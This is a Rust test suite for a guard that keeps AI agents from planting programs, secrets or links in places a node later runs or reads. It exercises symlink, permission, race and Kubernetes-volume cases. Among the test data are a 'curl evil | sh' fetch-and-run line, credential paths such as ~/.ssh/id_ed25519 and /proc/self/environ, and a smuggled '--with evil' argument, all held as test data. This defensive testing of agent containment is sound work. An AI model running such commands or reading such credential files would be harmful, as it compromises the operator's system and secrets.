    fn a_path_entry_inside_the_state_volume_is_never_used_or_passed_on() {
        // Kubernetes: HOME is /state/home, so ~/.local/bin is on the volume
        // harness pods mount.
        let node = Node::new();
        node.program("volume/home/.local/bin/buildctl");
        let mut layout = node.layout();
        layout.homes = vec![node.at("volume/home")];
        layout.path_var = Some(
            std::env::join_paths([
                node.at("volume/home/.local/bin"),
                PathBuf::from(""),
                PathBuf::from("relative/bin"),
                node.at("brew/bin"),
            ])
            .unwrap(),
        );
        layout
            .trusted_prefixes
            .push(node.at("volume/home/.local/bin"));
        let guard = node.guard_with(layout.clone(), &node.config());
        let refusal = guard
            .program("runtime.kubernetes.builder.buildctl", "buildctl")
            .unwrap_err();
        assert!(!refusal.missing);
        assert!(refusal.reason.contains("the state volume"), "{refusal}");
        // What a child is given keeps only the entry it could run from.
        assert_eq!(
            guard.child_path(),
            std::env::join_paths([node.at("brew/bin")]).unwrap()
        );

        // With a real one later on PATH, that one runs instead.
        let real = node.program("brew/bin/buildctl");
        let guard = node.guard_with(layout, &node.config());
        assert_eq!(
            guard
                .program("runtime.kubernetes.builder.buildctl", "buildctl")
                .unwrap(),
            real
        );
    }

    #[test]
    fn a_world_or_group_writable_directory_is_refused() {
        let node = Node::new();
        for (mode, words) in [(0o777, "every user"), (0o775, "by group")] {
            let dir = node.at(&format!("brew/shared-{mode:o}"));
            let gh = node.program(&format!("brew/shared-{mode:o}/gh"));
            std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(mode)).unwrap();
            // As a node whose group is not this tree's sees it.
            let refusal = node
                .guard()
                .in_group(4_000_000)
                .program("publish.gh", &shown(&gh))
                .unwrap_err();
            assert!(refusal.reason.contains(words), "{mode:o}: {refusal}");
        }
        // Writable by the node's own group, as a Kubernetes volume's
        // fsGroup makes everything: the node's own, so allowed in a
        // package manager's prefix.
        let dir = node.at("brew/own-group");
        let gh = node.program("brew/own-group/gh");
        std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o775)).unwrap();
        node.guard().program("publish.gh", &shown(&gh)).unwrap();
        // Sticky, like /tmp: each user replaces only their own entries.
        let dir = node.at("brew/sticky");
        let gh = node.program("brew/sticky/gh");
        std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o1777)).unwrap();
        node.guard().program("publish.gh", &shown(&gh)).unwrap();
    }

    #[test]
    fn a_file_another_user_owns_is_refused() {
        let node = Node::new();
        let gh = node.program("brew/bin/gh");
        // As a node running under another uid sees this tree.
        let refusal = node
            .guard()
            .running_as(4_000_000)
            .program("publish.gh", &shown(&gh))
            .unwrap_err();
        assert!(refusal.reason.contains("neither root nor"), "{refusal}");
    }

    #[test]
    fn relative_paths_and_parent_steps_are_refused() {
        let node = Node::new();
        let guard = node.guard();
        for value in ["bin/gh", "./gh", "../gh"] {
            let refusal = guard.program("publish.gh", value).unwrap_err();
            assert!(refusal.reason.contains("absolute"), "{value}: {refusal}");
        }
        node.program("brew/bin/gh");
        let sneaky = format!("{}/../../state/gh", shown(&node.at("brew/bin")));
        let refusal = guard.program("publish.gh", &sneaky).unwrap_err();
        assert!(refusal.reason.contains(".."), "{refusal}");
    }

    #[test]
    fn a_directory_or_a_file_without_an_execute_bit_is_refused() {
        let node = Node::new();
        node.dir("brew/bin/git");
        let refusal = node
            .guard()
            .program("publish.git", &shown(&node.at("brew/bin/git")))
            .unwrap_err();
        assert!(refusal.reason.contains("not a regular file"), "{refusal}");
        let gh = node.file("brew/bin/gh", "#!/bin/sh\n");
        let refusal = node.guard().program("publish.gh", &shown(&gh)).unwrap_err();
        assert!(refusal.reason.contains("not executable"), "{refusal}");
        let refusal = node.guard().program("publish.gh", "/dev/null").unwrap_err();
        assert!(refusal.reason.contains("called"), "{refusal}");
    }

    #[test]
    fn a_program_must_be_exactly_the_one_its_key_runs() {
        let node = Node::new();
        let refusal = node
            .guard()
            .program("publish.gh", &shown(&sh()))
            .unwrap_err();
        assert!(refusal.reason.contains("this key runs gh"), "{refusal}");
        let remote = node.program("brew/bin/podman-remote");
        node.guard()
            .program("boundary.podman", &shown(&remote))
            .unwrap();
        // No suffix is a wildcard: `git-shell` is not git.
        let shell = node.program("brew/bin/git-shell");
        assert!(node.guard().program("publish.git", &shown(&shell)).is_err());
    }

    #[test]
    fn a_bare_name_not_on_path_is_missing_not_unsafe() {
        let node = Node::new();
        let refusal = node.guard().program("publish.glab", "glab").unwrap_err();
        assert!(
            refusal.missing || refusal.reason.contains("only where"),
            "{refusal}"
        );
        // A missing file in a place an agent can write is unsafe all the
        // same: an agent could put it there later.
        let refusal = node
            .guard()
            .program("publish.gh", &shown(&node.at("state/bin/gh")))
            .unwrap_err();
        assert!(!refusal.missing, "{refusal}");
    }

    #[test]
    fn a_binary_swapped_after_it_was_allowed_is_refused_at_the_next_spawn() {
        let node = Node::new();
        let gh = node.program("brew/bin/gh");
        let guard = node.guard();
        assert!(guard.program("publish.gh", &shown(&gh)).is_ok());
        // Replaced by a link to what an agent wrote.
        let planted = node.program("work/tracon-9/gh");
        std::fs::remove_file(&gh).unwrap();
        std::os::unix::fs::symlink(&planted, &gh).unwrap();
        let refusal = guard.program("publish.gh", &shown(&gh)).unwrap_err();
        assert!(refusal.reason.contains("worktree root"), "{refusal}");
        // Or made writable by everyone.
        std::fs::remove_file(&gh).unwrap();
        node.program("brew/bin/gh");
        std::fs::set_permissions(&gh, std::fs::Permissions::from_mode(0o777)).unwrap();
        assert!(guard.program("publish.gh", &shown(&gh)).is_err());
    }

    #[test]
    fn a_secret_is_read_only_from_the_secrets_directories() {
        let node = Node::new();
        let guard = node.guard();
        let key = node.file("config/secrets/embed.key", "sk-1");
        guard
            .path("embed.api_key_file", &shown(&key), Stage::Edit)
            .unwrap();
        for (key, value) in [
            (
                "embed.api_key_file",
                node.file("home/.config/embed.key", "sk-1"),
            ),
            (
                "runtime.kubernetes.builder.do_token_file",
                node.file("home/token", "x"),
            ),
            ("runtime.kubernetes.builder.tls_dir", node.dir("home/tls")),
            (
                "runtime.kubernetes.builder.docker_config",
                node.dir("home/registry"),
            ),
        ] {
            let refusal = guard.path(key, &shown(&value), Stage::Edit).unwrap_err();
            assert!(
                refusal.reason.contains("set aside for the node's secrets"),
                "{key}: {refusal}"
            );
        }
        // A file placed by hand before the guard is still read at use.
        let old = node.file("home/.config/old.key", "sk-0");
        guard
            .path("embed.api_key_file", &shown(&old), Stage::Use)
            .unwrap();
        // Not through a link out of the secrets directory.
        let link = node.at("config/secrets/link.key");
        std::os::unix::fs::symlink(&old, &link).unwrap();
        assert!(guard
            .path("embed.api_key_file", &shown(&link), Stage::Edit)
            .is_err());
    }

    #[test]
    fn the_embedding_key_cannot_be_the_nodes_own_secrets() {
        let node = Node::new();
        let db = node.file("state/node.db", "SQLite format 3");
        let seed = node.file("state/node-identity.seed", &"ab".repeat(32));
        let guard = node.guard();
        for stage in [Stage::Edit, Stage::Use] {
            for secret in [&db, &seed] {
                let refusal = guard
                    .path("embed.api_key_file", &shown(secret), stage)
                    .unwrap_err();
                assert!(refusal.reason.contains("node's own"), "{refusal}");
            }
        }
        // Not through a link outside the state directory, nor a hard link
        // in the secrets directory itself.
        let link = node.at("config/secrets/key");
        std::os::unix::fs::symlink(&seed, &link).unwrap();
        let refusal = guard
            .path("embed.api_key_file", &shown(&link), Stage::Use)
            .unwrap_err();
        assert!(refusal.reason.contains("node's own"), "{refusal}");
        let hard = node.at("config/secrets/key-2");
        std::fs::hard_link(&seed, &hard).unwrap();
        let refusal = guard
            .path("embed.api_key_file", &shown(&hard), Stage::Use)
            .unwrap_err();
        assert!(refusal.reason.contains("node-identity.seed"), "{refusal}");
    }

    /// Every spelling of the home directory is the home directory: through
    /// a link to it (`/home` and `/var/home`), and by identity.
    #[test]
    fn an_operators_credentials_are_refused_whatever_the_homes_spelling() {
        let node = Node::new();
        let key = node.file("home/.ssh/id_ed25519", "-----BEGIN");
        let alias = node.at("home-link");
        std::os::unix::fs::symlink(node.at("home"), &alias).unwrap();
        let other = node.file("home/.claude/.credentials.json", "{}");
        for homes in [vec![node.at("home")], vec![alias.clone()]] {
            let mut layout = node.layout();
            layout.homes = homes;
            let guard = node.guard_with(layout, &node.config());
            for path in [
                key.clone(),
                alias.join(".ssh/id_ed25519"),
                other.clone(),
                alias.join(".claude/.credentials.json"),
            ] {
                let refusal = guard
                    .path("embed.api_key_file", &shown(&path), Stage::Use)
                    .unwrap_err();
                assert!(
                    refusal.reason.contains("credentials"),
                    "{path:?}: {refusal}"
                );
            }
        }
        let refusal = node
            .guard()
            .path("embed.api_key_file", "/proc/self/environ", Stage::Use)
            .unwrap_err();
        assert!(refusal.reason.contains("kernel"), "{refusal}");
    }

    #[test]
    fn a_secret_file_an_agent_could_plant_is_refused() {
        let node = Node::new();
        let planted = node.file("work/tracon-1/token", "x");
        let refusal = node
            .guard()
            .path(
                "runtime.kubernetes.builder.do_token_file",
                &shown(&planted),
                Stage::Use,
            )
            .unwrap_err();
        assert!(refusal.reason.contains("agent"), "{refusal}");
    }

    #[test]
    fn documents_are_exported_only_into_the_export_area_or_a_marked_directory() {
        let node = Node::new();
        let guard = node.guard();
        for (dir, words) in [
            ("/etc/tracon".to_string(), "system directory"),
            ("/".to_string(), "root directory"),
            (shown(&node.at("config/docs")), "configuration directory"),
            (shown(&node.at("state/docs")), "state directory"),
            (shown(&node.at("work/docs")), "worktree root"),
            (shown(&node.at("brew/bin")), "programs are installed"),
            (shown(&node.at("home")), "home directory itself"),
            (shown(&node.base), "holds"),
            ("~/.bashrc.d".to_string(), "marked for exports"),
            ("~/.claude/agents".to_string(), "marked for exports"),
            ("~/.npm-global/bin".to_string(), "marked for exports"),
        ] {
            node.dir("home/.claude/agents");
            let refusal = guard
                .path("docs.export_dir", &dir, Stage::Edit)
                .unwrap_err();
            assert!(refusal.reason.contains(words), "{dir}: {refusal}");
        }
        guard
            .path(
                "docs.export_dir",
                &shown(&node.at("data/exports/notes")),
                Stage::Edit,
            )
            .unwrap();
        // The operator marks a directory by hand; then it may be named.
        let notes = node.dir("home/notes");
        assert!(guard
            .path("docs.export_dir", "~/notes", Stage::Edit)
            .is_err());
        node.file("home/notes/.tracon-export", "");
        guard
            .path("docs.export_dir", &shown(&notes), Stage::Edit)
            .unwrap();
        guard
            .path("docs.export_dir", "~/notes", Stage::Use)
            .unwrap();
    }

    #[test]
    fn the_ui_bundle_directory_is_the_nodes_own_or_does_not_exist_yet() {
        let node = Node::new();
        let guard = node.guard();
        let src = node.dir("home/src");
        let refusal = guard
            .path("ui.opencode_bundle_dir", &shown(&src), Stage::Edit)
            .unwrap_err();
        assert!(refusal.reason.contains("already exists"), "{refusal}");
        for ok in [
            node.at("state/opencode-ui"),
            node.dir("data/opencode-ui"),
            node.at("home/new-ui"),
        ] {
            guard
                .path("ui.opencode_bundle_dir", &shown(&ok), Stage::Edit)
                .unwrap();
        }
    }

    #[test]
    fn a_worktree_root_may_not_be_slash_or_hold_the_state_or_config() {
        let node = Node::new();
        let guard = node.guard();
        for dir in ["/".to_string(), shown(&node.base), "/usr/local/src".into()] {
            assert!(
                guard
                    .path("session.worktree_root", &dir, Stage::Edit)
                    .is_err(),
                "{dir} was allowed"
            );
        }
        guard
            .path(
                "session.worktree_root",
                &shown(&node.at("work")),
                Stage::Edit,
            )
            .unwrap();
        guard
            .path("external.repo_roots", "~/src", Stage::Edit)
            .unwrap();
        // A link to `/` is `/`.
        let link = node.at("home/everything");
        std::os::unix::fs::symlink("/", &link).unwrap();
        assert!(guard
            .path("external.repo_roots", &shown(&link), Stage::Edit)
            .is_err());
    }

    #[test]
    fn the_state_mount_is_never_slash_or_a_system_directory() {
        let node = Node::new();
        let guard = node.guard();
        for dir in ["/", "/usr/lib/state", "state"] {
            assert!(
                guard
                    .path("runtime.kubernetes.state_mount", dir, Stage::Edit)
                    .is_err(),
                "{dir} was allowed"
            );
        }
        guard
            .path("runtime.kubernetes.state_mount", "/state", Stage::Edit)
            .unwrap();
    }

    /// An edit judged against the places both files name: a root moved onto
    /// a program's directory is refused, and so is a root moved away from a
    /// program it held in the same edit.
    #[test]
    fn a_root_moved_onto_or_away_from_a_program_is_refused() {
        let node = Node::new();
        let gh = node.program("brew/bin/gh");
        let mut before = node.config();
        before.publish.gh = shown(&gh);
        let mut after = before.clone();
        after.session.worktree_root = node.at("brew/bin");
        let error = refuse_new_in(node.layout(), Some(&before), &after).unwrap_err();
        assert!(error.contains("session.worktree_root"), "{error}");

        let planted = node.program("work/tracon-1/gh");
        let mut after = before.clone();
        after.session.worktree_root = node.dir("elsewhere-work");
        after.publish.gh = shown(&planted);
        let error = refuse_new_in(node.layout(), Some(&before), &after).unwrap_err();
        assert!(error.contains("publish.gh"), "{error}");

        // And a key already wrong does not block an unrelated change.
        let mut broken = before.clone();
        broken.publish.gh = shown(&planted);
        let mut after = broken.clone();
        after.node_name = "other".into();
        refuse_new_in(node.layout(), Some(&broken), &after).unwrap();
    }

    fn consulta(command: &Path, args: &[&str]) -> Consulta {
        Consulta {
            command: shown(command),
            args: args.iter().map(|s| s.to_string()).collect(),
            timeout_secs: 60,
        }
    }

    #[test]
    fn consulta_runs_only_consulta_through_uv() {
        let node = Node::new();
        let uv = node.program("brew/bin/uv");
        node.file(
            "home/src/consulta/pyproject.toml",
            "[project]\nname = \"consulta\"\n",
        );
        let guard = node.guard();
        let project = shown(&node.at("home/src/consulta"));
        guard
            .consulta(&consulta(&uv, &["run", "--project", &project, "consulta"]))
            .unwrap();
        guard
            .consulta(&consulta(
                &uv,
                &[
                    "run",
                    "--frozen",
                    &format!("--project={project}"),
                    "consulta",
                ],
            ))
            .unwrap();
        node.file(
            "home/src/other/pyproject.toml",
            "[project]\nname = \"other\"\n",
        );
        node.dir("home/src/empty");
        for (args, words) in [
            (vec!["run", "python", "-c", "x"], "only consulta"),
            (
                vec!["run", "--with", "evil", "consulta"],
                "could choose what runs",
            ),
            (
                vec!["run", "--directory", "/tmp", "consulta"],
                "could choose what runs",
            ),
            (vec!["tool", "run", "consulta"], "must start with `run`"),
            (vec!["run", "--project"], "needs a directory"),
            (vec!["run"], "names no program"),
            (
                vec!["run", "--project", &project, "consulta", "--output", "/x"],
                "nothing may follow",
            ),
            (
                vec!["run", "consulta", "--profile", "x"],
                "nothing may follow",
            ),
            (vec!["run", "--project", "/", "consulta"], "root directory"),
            (
                vec![
                    "run",
                    "--project",
                    &shown(&node.at("home/src/other")),
                    "consulta",
                ],
                "not consulta's",
            ),
            (
                vec![
                    "run",
                    "--project",
                    &shown(&node.at("home/src/empty")),
                    "consulta",
                ],
                "no pyproject",
            ),
        ] {
            let refusal = guard.consulta(&consulta(&uv, &args)).unwrap_err();
            assert_eq!(refusal.key, "consulta.args");
            assert!(refusal.reason.contains(words), "{args:?}: {refusal}");
        }
        let planted = shown(&node.dir("state/sessions/x"));
        let refusal = guard
            .consulta(&consulta(&uv, &["run", "--project", &planted, "consulta"]))
            .unwrap_err();
        assert!(refusal.reason.contains("agent"), "{refusal}");
        // consulta itself takes nothing from here.
        let direct = node.program("brew/bin/consulta");
        guard.consulta(&consulta(&direct, &[])).unwrap();
        let refusal = guard
            .consulta(&consulta(&direct, &["--output", "/home/x/.bashrc"]))
            .unwrap_err();
        assert!(refusal.reason.contains("takes no arguments"), "{refusal}");
        // A shell is not consulta's command at all.
        let refusal = guard.consulta(&consulta(&sh(), &["-c", "id"])).unwrap_err();
        assert_eq!(refusal.key, "consulta.command");
    }

    /// A file written before the guard existed still loads, and `serve`
    /// reports it; what it names is refused when the node goes to run it.
    #[test]
    fn a_config_that_breaks_the_rules_still_loads_and_its_program_is_refused() {
        let node = Node::new();
        let planted = node.program("work/tracon-1/gh");
        let text = format!(
            "[session]\nworktree_root = {:?}\n[publish]\ngh = {:?}\n",
            shown(&node.at("work")),
            shown(&planted)
        );
        let cfg = Config::from_toml(&text, Path::new("node.toml")).unwrap();
        let guard = node.guard_with(node.layout(), &cfg);
        let refusals = guard.check(&cfg);
        assert!(
            refusals.iter().any(|r| r.key == "publish.gh" && !r.missing),
            "{refusals:?}"
        );
        let error = std::io::Error::from(guard.program("publish.gh", &cfg.publish.gh).unwrap_err());
        assert_eq!(error.kind(), std::io::ErrorKind::PermissionDenied);
    }

    #[test]
    fn the_guard_checks_every_path_key_the_schema_names() {
        let schema: BTreeSet<(&str, String)> = crate::config_schema::KEYS
            .iter()
            .filter_map(|spec| spec.path.map(|kind| (spec.key, format!("{kind:?}"))))
            .collect();
        let guarded: BTreeSet<(&str, String)> = GUARDED
            .iter()
            .map(|(key, kind)| (*key, format!("{kind:?}")))
            .collect();
        assert_eq!(schema, guarded);
        let mut cfg = Config::default();
        cfg.runtime.kubernetes.builder = Some(Default::default());
        cfg.runtime
            .kubernetes
            .builder
            .as_mut()
            .unwrap()
            .do_token_file = Some("/x".into());
        cfg.embed.api_key_file = Some("/x".into());
        cfg.docs.export_dir = Some("/x".into());
        cfg.ui.opencode_bundle_dir = Some("/x".into());
        let listed: BTreeSet<&str> = values(&cfg).into_iter().map(|(key, _)| key).collect();
        let keys: BTreeSet<&str> = GUARDED.iter().map(|(key, _)| *key).collect();
        assert_eq!(listed, keys);
    }

    #[test]
    fn the_node_secrets_named_here_are_the_ones_the_node_keeps() {
        let state = Config::state_dir();
        let secrets: Vec<PathBuf> = NODE_SECRETS.iter().map(|n| state.join(n)).collect();
        for path in [
            Config::db_path(),
            crate::mesh::identity::seed_path(),
            crate::broker::Broker::path(),
            crate::broker::Broker::plain_path(),
            crate::policy::bundle::Paths::signing_key(),
        ] {
            assert!(secrets.contains(&path), "{path:?} is not listed");
        }
    }

    #[test]
    fn a_root_spelled_through_a_link_is_still_that_root() {
        // macOS: /tmp is a link to /private/tmp, and either spelling may be
        // configured or reached.
        let node = Node::new();
        let real = node.dir("private-tmp");
        let tmp = node.at("tmp");
        std::os::unix::fs::symlink(&real, &tmp).unwrap();
        let mut cfg = node.config();
        cfg.session.worktree_root = tmp.clone();
        let guard = node.guard_with(node.layout(), &cfg);
        let planted = node.program("private-tmp/tracon-1/gh");
        let refusal = guard.program("publish.gh", &shown(&planted)).unwrap_err();
        assert!(refusal.reason.contains("worktree root"), "{refusal}");
    }

    /// macOS keeps `node.toml` in the state directory, so the secrets
    /// directory, the export area and the bundle's default all sit there.
    #[test]
    fn a_layout_whose_configuration_is_its_state_still_has_its_own_areas() {
        for node in [Node::new(), Node::behind_link()] {
            configuration_in_state(node);
        }
    }

    fn configuration_in_state(node: Node) {
        let mut layout = node.layout();
        layout.config_dir = node.at("state");
        layout.data_dir = node.at("state");
        let guard = node.guard_with(layout, &node.config());
        let key = node.file("state/secrets/embed.key", "sk-1");
        guard
            .path("embed.api_key_file", &shown(&key), Stage::Edit)
            .unwrap();
        guard
            .path(
                "docs.export_dir",
                &shown(&node.at("state/exports")),
                Stage::Edit,
            )
            .unwrap();
        guard
            .path(
                "ui.opencode_bundle_dir",
                &shown(&node.at("state/opencode-ui")),
                Stage::Edit,
            )
            .unwrap();
        // Elsewhere in it is still the state directory.
        let staged = node.file("state/workspaces/x/token", "x");
        assert!(guard
            .path("embed.api_key_file", &shown(&staged), Stage::Use)
            .is_err());
        assert!(guard
            .path(
                "docs.export_dir",
                &shown(&node.at("state/docs")),
                Stage::Edit
            )
            .is_err());
    }

    /// The reviewer's probe: an agent writes the marker (and a bundle) into
    /// its own Podman volume; neither directory may then be named.
    #[test]
    fn an_agents_volume_is_never_an_export_or_bundle_directory() {
        let node = Node::new();
        let mut layout = node.layout();
        layout
            .agent_roots
            .push(("Podman's container storage".into(), node.at("containers")));
        let guard = node.guard_with(layout, &node.config());
        let volume = node.dir("containers/storage/volumes/tracon-workspace-x/_data");
        node.file(
            "containers/storage/volumes/tracon-workspace-x/_data/.tracon-export",
            "",
        );
        let refusal = guard
            .path("docs.export_dir", &shown(&volume), Stage::Use)
            .unwrap_err();
        assert!(
            refusal.reason.contains("which an agent can write"),
            "{refusal}"
        );
        let refusal = guard
            .path(
                "ui.opencode_bundle_dir",
                &shown(&volume.join("ui")),
                Stage::Edit,
            )
            .unwrap_err();
        assert!(
            refusal.reason.contains("which an agent can write"),
            "{refusal}"
        );
    }

    /// Kubernetes: the claim is mounted at `/state`, the state directory is
    /// `/state/tracon`, harness pods mount `/state/tracon-*`, and the
    /// configuration is in `/state/config/tracon`.
    fn pod(node: &Node) -> Layout {
        let mut layout = node.layout();
        layout.state_dir = node.dir("pvc/tracon");
        layout.config_dir = node.dir("pvc/config/tracon");
        layout.homes = vec![node.dir("pvc/home")];
        layout.state_volume = Some(node.at("pvc"));
        layout
    }

    /// Moving the state mount and then naming a workspace on the claim is
    /// refused at either step: the claim is found from the running process,
    /// and the running node's places stand until it restarts.
    #[test]
    fn two_edits_cannot_move_the_state_volume_and_then_use_it() {
        let node = Node::new();
        let mut running_cfg = node.config();
        running_cfg.runtime.kind = super::super::RuntimeKind::Kubernetes;
        running_cfg.runtime.kubernetes.state_mount = node.at("pvc");
        node.file(
            "pvc/tracon-workspace-x/pyproject.toml",
            "[project]\nname = \"consulta\"\n",
        );
        let workspace = shown(&node.at("pvc/tracon-workspace-x"));

        // Edit 1: the mount moves.
        let mut moved = running_cfg.clone();
        moved.runtime.kubernetes.state_mount = node.at("elsewhere");
        let error = refuse_new_with(pod(&node), None, Some(&running_cfg), &moved).unwrap_err();
        assert!(error.contains("state_mount"), "{error}");

        // Edit 2, as if the first had been written by hand: consulta's
        // project in a workspace on the claim.
        let mut after = moved.clone();
        after.consulta.command = "uv".into();
        after.consulta.args = ["run", "--project", &workspace, "consulta"]
            .map(String::from)
            .to_vec();
        // Refused by the claim the process found...
        let error = refuse_new_with(pod(&node), None, Some(&moved), &after).unwrap_err();
        assert!(error.contains("consulta.args"), "{error}");
        // ...and by the running node's places without it.
        let mut bare = pod(&node);
        bare.state_volume = None;
        let running = Guard::new(bare.clone(), &[&running_cfg]);
        let error = refuse_new_with(bare, Some(&running), Some(&moved), &after).unwrap_err();
        assert!(error.contains("consulta.args"), "{error}");
    }

    /// The configuration's secrets directory is the node's own on the claim
    /// too; the rest of the claim is not.
    #[test]
    fn a_pods_secrets_directory_on_the_claim_is_allowed() {
        let node = Node::new();
        let mut cfg = node.config();
        cfg.runtime.kind = super::super::RuntimeKind::Kubernetes;
        cfg.runtime.kubernetes.state_mount = node.at("pvc");
        let guard = node.guard_with(pod(&node), &cfg);
        let key = node.file("pvc/config/tracon/secrets/embed.key", "sk");
        guard
            .path("embed.api_key_file", &shown(&key), Stage::Edit)
            .unwrap();
        let planted = node.file("pvc/tracon-workspace-x/embed.key", "sk");
        let refusal = guard
            .path("embed.api_key_file", &shown(&planted), Stage::Use)
            .unwrap_err();
        assert!(refusal.reason.contains("state volume"), "{refusal}");
    }

    /// Bazzite: `/home` is a link to `/var/home`. The export area named in
    /// either spelling is the node's own, before and after it is made,
    /// without a new guard.
    #[test]
    fn the_export_area_is_recognised_through_a_linked_home_before_it_exists() {
        for node in [Node::new(), Node::behind_link()] {
            export_area_through_a_linked_home(node);
        }
    }

    fn export_area_through_a_linked_home(node: Node) {
        let real = node.dir("var/home/jd");
        let link = node.at("home-link");
        std::os::unix::fs::symlink(&real, &link).unwrap();
        let mut layout = node.layout();
        layout.homes = vec![link.clone()];
        layout.data_dir = link.join(".local/share/tracon");
        let guard = node.guard_with(layout, &node.config());
        for spelling in [&link, &real] {
            let exports = spelling.join(".local/share/tracon/exports");
            guard
                .path("docs.export_dir", &shown(&exports), Stage::Edit)
                .unwrap();
        }
        node.dir("var/home/jd/.local/share/tracon/exports");
        for spelling in [&link, &real] {
            let exports = spelling.join(".local/share/tracon/exports");
            guard
                .path("docs.export_dir", &shown(&exports), Stage::Use)
                .unwrap();
        }
    }

    /// The final re-review's probe: an export directory spelled inside an
    /// agent's volume, reaching the export area (or a marked directory)
    /// through a link the agent made, is refused; so is a bundle directory
    /// reaching the state directory that way.
    #[test]
    fn a_link_an_agent_made_into_an_own_area_does_not_bring_its_path_along() {
        for node in [Node::new(), Node::behind_link()] {
            agent_link_into_an_own_area(node);
        }
    }

    fn agent_link_into_an_own_area(node: Node) {
        let mut layout = node.layout();
        layout
            .agent_roots
            .push(("Podman's container storage".into(), node.at("containers")));
        let guard = node.guard_with(layout, &node.config());
        let volume = node.dir("containers/volumes/tracon-workspace-x/_data");
        node.dir("data/exports/sub");
        std::os::unix::fs::symlink(node.at("data/exports"), volume.join("l")).unwrap();
        let notes = node.dir("home/notes");
        node.file("home/notes/.tracon-export", "");
        std::os::unix::fs::symlink(&notes, volume.join("m")).unwrap();
        std::os::unix::fs::symlink(node.at("state"), volume.join("s")).unwrap();
        for (key, value) in [
            ("docs.export_dir", volume.join("l/sub")),
            ("docs.export_dir", volume.join("l")),
            ("docs.export_dir", volume.join("m")),
            ("ui.opencode_bundle_dir", volume.join("s/opencode-ui")),
        ] {
            for stage in [Stage::Edit, Stage::Use] {
                let refusal = guard.path(key, &shown(&value), stage).unwrap_err();
                assert!(
                    refusal.reason.contains("which an agent can write"),
                    "{key} {value:?}: {refusal}"
                );
            }
        }
    }

    /// The same, on a pod's claim: a secret spelled in a workspace and
    /// linked into the configuration's secrets is the workspace's.
    #[test]
    fn a_link_from_a_workspace_into_the_secrets_directory_is_refused() {
        for node in [Node::new(), Node::behind_link()] {
            workspace_link_into_secrets(node);
        }
    }

    fn workspace_link_into_secrets(node: Node) {
        let mut cfg = node.config();
        cfg.runtime.kind = super::super::RuntimeKind::Kubernetes;
        cfg.runtime.kubernetes.state_mount = node.at("pvc");
        let guard = node.guard_with(pod(&node), &cfg);
        let secrets = node.at("pvc/config/tracon/secrets");
        node.file("pvc/config/tracon/secrets/embed.key", "real");
        let workspace = node.dir("pvc/tracon-workspace-x");
        std::os::unix::fs::symlink(&secrets, workspace.join("l")).unwrap();
        for (key, value) in [
            ("embed.api_key_file", workspace.join("l/embed.key")),
            ("runtime.kubernetes.builder.tls_dir", workspace.join("l")),
            (
                "runtime.kubernetes.builder.docker_config",
                workspace.join("l"),
            ),
        ] {
            for stage in [Stage::Edit, Stage::Use] {
                let refusal = guard.path(key, &shown(&value), stage).unwrap_err();
                assert!(refusal.reason.contains("agent"), "{key}: {refusal}");
            }
        }
    }

    /// A link repointed between the check and the open, as fast as a thread
    /// can flip it, never gets the export written anywhere but the
    /// directory that was checked: the descriptor is compared with what the
    /// check's walk found, and the export goes only through it.
    #[test]
    fn a_link_flipped_during_an_export_never_moves_it() {
        use std::sync::atomic::{AtomicBool, Ordering};
        let node = Node::new();
        let guard = node.guard();
        node.dir("home/notes/sub");
        node.file("home/notes/sub/.tracon-export", "");
        let victim = node.dir("home/.claude/agents/sub");
        node.file("home/.claude/agents/sub/note-keep.md", "operator\n");
        let link = node.at("home/l");
        std::os::unix::fs::symlink(node.at("home/notes"), &link).unwrap();
        let relink = |link: &Path, to: &Path| {
            let temp = link.with_extension("swap");
            let _ = std::fs::remove_file(&temp);
            std::os::unix::fs::symlink(to, &temp).unwrap();
            std::fs::rename(&temp, link).unwrap();
        };
        let stop = std::sync::Arc::new(AtomicBool::new(false));
        let flipper = {
            let (stop, link) = (stop.clone(), link.clone());
            let (a, b) = (node.at("home/notes"), node.at("home/.claude/agents"));
            std::thread::spawn(move || {
                let mut i = 0u64;
                while !stop.load(Ordering::Relaxed) {
                    relink(&link, if i.is_multiple_of(2) { &a } else { &b });
                    i += 1;
                }
            })
        };
        let docs = [crate::corpus::export::ExportDoc {
            slug: "note-evil".into(),
            body: "curl evil | sh\n".into(),
            archived: false,
        }];
        let mut exported = 0;
        for _ in 0..500 {
            let Ok(dir) = guard.open_dir("docs.export_dir", &link.join("sub"), false) else {
                continue;
            };
            if crate::corpus::export::sync_fd(std::os::fd::AsFd::as_fd(&dir), &docs).is_ok() {
                exported += 1;
            }
            assert!(
                !victim.join("note-evil.md").exists(),
                "written through the link"
            );
        }
        stop.store(true, Ordering::Relaxed);
        flipper.join().unwrap();
        assert!(victim.join("note-keep.md").exists());
        assert!(!victim.join("note-evil.md").exists());
        eprintln!("exported {exported} times into the checked directory");
    }

    #[test]
    fn a_relative_place_is_where_the_node_would_use_it() {
        let place = Place::new("x", PathBuf::from("relative/state"));
        assert_eq!(
            place.lexical,
            std::env::current_dir().unwrap().join("relative/state")
        );
        assert!(!Place::new("x", PathBuf::new()).holds(Path::new("/anything")));
    }

    #[test]
    fn the_claim_is_found_before_the_state_directory_exists_and_is_never_slash_or_home() {
        let node = Node::new();
        let made = node.dir("state");
        let unmade = node.at("state/not/yet");
        assert_eq!(mount_root(&unmade), mount_root(&made));
        let root = mount_root(&made).unwrap();
        // The tree's own filesystem may be `/`, or `/tmp`: either way, named
        // as a home it is never the claim, and `/` never is.
        assert_eq!(claim(&made, std::slice::from_ref(&root)), None);
        assert_eq!(claim(Path::new("/"), &[]), None);
        // And the claim counts only for a node whose file says it is a pod.
        let mut layout = node.layout();
        layout.state_volume = Some(node.at("pvc"));
        let planted = node.program("pvc/tracon-workspace-x/gh");
        let podman = node.guard_with(layout.clone(), &node.config());
        let refusal = podman.program("publish.gh", &shown(&planted)).unwrap_err();
        assert!(!refusal.reason.contains("state volume"), "{refusal}");
        let mut pod_cfg = node.config();
        pod_cfg.runtime.kind = super::super::RuntimeKind::Kubernetes;
        let pod_guard = node.guard_with(layout, &pod_cfg);
        let refusal = pod_guard
            .program("publish.gh", &shown(&planted))
            .unwrap_err();
        assert!(refusal.reason.contains("state volume"), "{refusal}");
    }

    #[test]
    fn the_password_database_knows_this_users_home() {
        let home = passwd_home().expect("no home in the password database");
        assert!(home.is_absolute());
    }
}
